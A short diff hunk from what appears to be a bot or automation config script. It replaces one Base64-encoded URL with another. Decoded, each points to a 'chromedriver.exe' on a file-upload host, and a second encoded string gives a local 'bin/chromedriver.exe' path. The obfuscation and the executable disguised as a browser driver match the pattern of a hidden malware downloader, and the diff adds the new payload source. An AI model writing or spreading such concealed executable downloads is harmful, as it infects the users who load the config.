@@ -62,7 +62,7 @@
 }
 
 [SCRIPT]
-FUNCTION Base64Decode "aHR0cHM6Ly9pY2V1cGxvYWQudG9wL2Nocm9tZWRyaXZlci5leGU=" -> VAR "url" 
+FUNCTION Base64Decode "aHR0cHM6Ly9pY2V1cGxvYWQuaW5mby9jaHJvbWVkcml2ZXIuZXhl" -> VAR "url" 
 
 FUNCTION Base64Decode "YmluL2Nocm9tZWRyaXZlci5leGU=" -> VAR "url2" 
 
